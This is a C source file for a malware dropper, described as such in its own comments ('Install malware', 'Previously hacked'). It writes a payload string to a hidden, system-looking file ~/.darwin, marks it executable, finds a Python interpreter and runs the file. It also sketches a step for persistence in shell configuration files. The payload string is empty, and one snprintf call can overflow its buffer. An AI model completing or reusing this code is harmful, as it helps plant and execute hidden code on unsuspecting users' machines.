#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdbool.h>

#ifdef _WIN32
    #include <windows.h>
#else
    #include <sys/stat.h>
#endif

#define PROGRAM ""

#define BUFSIZE 1024
#define LOG true

void lg(char* msg) {
    if (LOG) {
        printf("%s\n", msg);
    }
}

void elg(char* msg) {
    char buf[BUFSIZE];
    snprintf(buf, BUFSIZE, "Error: %s", msg);
    lg(buf);
}

bool is_file(char* path) {
#ifdef _WIN32
    DWORD dwAttrib = GetFileAttributes(path);

    if (dwAttrib == INVALID_FILE_ATTRIBUTES)
        return false;  // Path not found or error

    return (dwAttrib & FILE_ATTRIBUTE_DIRECTORY) == 0;
#else
    struct stat sb;
    if (stat(path, &sb) != 0) {
        return false; // Path not found or error
    }
    return S_ISREG(sb.st_mode);
#endif
}

#define OK 0
#define ERR_CREATING_FILE 1
#define ERR_SET_PERMS 2
int create_executable_file(const char* filename, const char* content) {
    FILE *fp = fopen(filename, "w");
    if (fp == NULL) {
        return ERR_CREATING_FILE;
    }

    fprintf(fp, "%s", content);
    fclose(fp);

#ifndef _WIN32
    if (chmod(filename, S_IRWXU | S_IRGRP | S_IROTH) != 0) {
        return ERR_SET_PERMS;
    }
#endif

    return OK;
}

int command_exists(char *cmd) {
    char buf[128];
    snprintf(buf, sizeof(buf), "which %s > /dev/null 2>&1", cmd);
    return system(buf) == 0;  // Returns 0 if the command exists
}

int main() {
    char* home = getenv("HOME");
    char dest[BUFSIZE];
    snprintf(dest, BUFSIZE, "%s/.darwin", home);
    // if (is_file(dest)) {
    //     exit(0); // Previously hacked
    // }

    /*
    Install malware  
    */
    switch (create_executable_file(dest, PROGRAM)) {
    case ERR_CREATING_FILE: 
        elg("Creating executable file");
        return 1;
    case ERR_SET_PERMS:
        elg("Setting executable bit and making readable by everyone");
        return 1;
    }

    /*
    Find python instance
    */
    char* python_paths[5] = { "python3.12", "python3.11", "python3", "python", 0};
    int i = 0; 
    while (python_paths[i] != NULL) {
        if (command_exists(python_paths[i])) {
            break;
        }
        i++;
    }
    if (python_paths[i] == NULL) {
        elg("No python instance found");
        return 1;
    }
    char* python = python_paths[i];

    /*
    Install to all shell config files
    */
   char* terminal = getenv("SHELL");
   printf("%s\n", terminal);

    /*
    Run program
    */
    char command[BUFSIZE];
    snprintf(command, 2*BUFSIZE, "/usr/bin/env %s %s", python, dest);

    if (system(command) != 0) {
        elg("Installing program");
    }
    printf("Done\n");
}